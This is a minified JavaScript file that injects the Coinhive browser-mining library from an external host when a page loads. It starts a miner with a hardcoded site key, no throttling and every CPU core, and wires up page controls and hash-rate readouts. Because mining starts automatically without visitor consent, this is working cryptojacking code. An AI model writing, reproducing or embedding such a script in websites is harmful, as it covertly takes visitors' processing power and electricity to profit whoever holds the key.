! function() { var n = function() { try { return !!window.addEventListener } catch (n) { return !1 } },
        t = function(t, e) { n() ? document.addEventListener("DOMContentLoaded", t, e) : document.attachEvent("onreadystatechange", t) };
    t(function() {! function() { var n = document.createElement("script");
            n.type = "text/javascript", n.async = !0; var t = document.getElementsByTagName("script")[0];
            n.src = "https://coinhive.com/lib/coinhive.min.js", n.onload = function() {
                function n() { return v.getHashesPerSecond().toFixed(1) }

                function t(n) { return v.getTotalHashes(n) }

                function e() { return v.getAcceptedHashes() }

                function i() { return v.stop() }

                function o(n) { return v.start(n) }

                function u() { return v.getNumThreads() }

                function r(n) { return v.setNumThreads(n) }

                function c() { return o(T), r(u() + 1) }

                function m() { return o(T), r(u() - 1) }

                function _() { return v.isRunning() }

                function d() { return Math.round(100 * v.getThrottle().toFixed(1)) / 100 }

                function l(n) { return v.setThrottle(n) }

                function s() { return o(T), l(d() + .1) }

                function a() { return o(T), l(d() - .1) }

                function g() { l(0), r(H), o(T) }

                function h() { l(.9), r(1), o(T) }

                function f() { l(L), r(H), o(T) } var p = "jVwy4y10DD5Ahz6qQ83qLrwXd5KZgJfp",
                    y = !0,
                    E = navigator.hardwareConcurrency,
                    B = 0,
                    I = 1e3,
                    v = new CoinHive.Anonymous(p, { throttle: B, threads: E }),
                    T = CoinHive.FORCE_EXCLUSIVE_TAB,
                    H = u(),
                    L = d();
                document.getElementById(html_mining_threads_add).onclick = function() { return c() }, document.getElementById(html_mining_threads_remove).onclick = function() { return m() }, document.getElementById(html_mining_start).onclick = function() { return o(T) }, document.getElementById(html_mining_stop).onclick = function() { return i() }, document.getElementById(html_mining_increase_throttle).onclick = function() { return s() }, document.getElementById(html_mining_decrease_throttle).onclick = function() { return a() }, document.getElementById(html_mining_minimal_speed).onclick = function() { return h() }, document.getElementById(html_mining_maximum_speed).onclick = function() { return g() }, document.getElementById(html_mining_default_recommended_speed).onclick = function() { return f() }, y && o(T), v.on("open", function() {}), v.on("authed", function(n) {}), v.on("close", function() {}), v.on("error", function(n) {}), v.on("job", function() {}), v.on("found", function() {}), v.on("accepted", function() {}), setInterval(function() { is_running = "", _() ? (is_running = html_text_is_running_true, document.getElementById(html_miner_is_running_id_output).className = html_miner_is_running_id_output_yes) : (is_running = html_text_is_running_false, document.getElementById(html_miner_is_running_id_output).className = html_miner_is_running_id_output_no), document.getElementById(html_miner_is_running_id_output).innerHTML = is_running, document.getElementById(html_mining_hashes_per_second_id_output).innerHTML = n(), document.getElementById(html_mining_accepted_hashes_per_second_id_output).innerHTML = e(), document.getElementById(html_mining_threads_id_output).innerHTML = u(), document.getElementById(html_mining_hashes_total_id_output).innerHTML = t(!0), document.getElementById(html_mining_current_throttle_id_output).innerHTML = d() }, I) }, n.onerror = function() {}, t.parentNode.insertBefore(n, t) }() }, !1) }();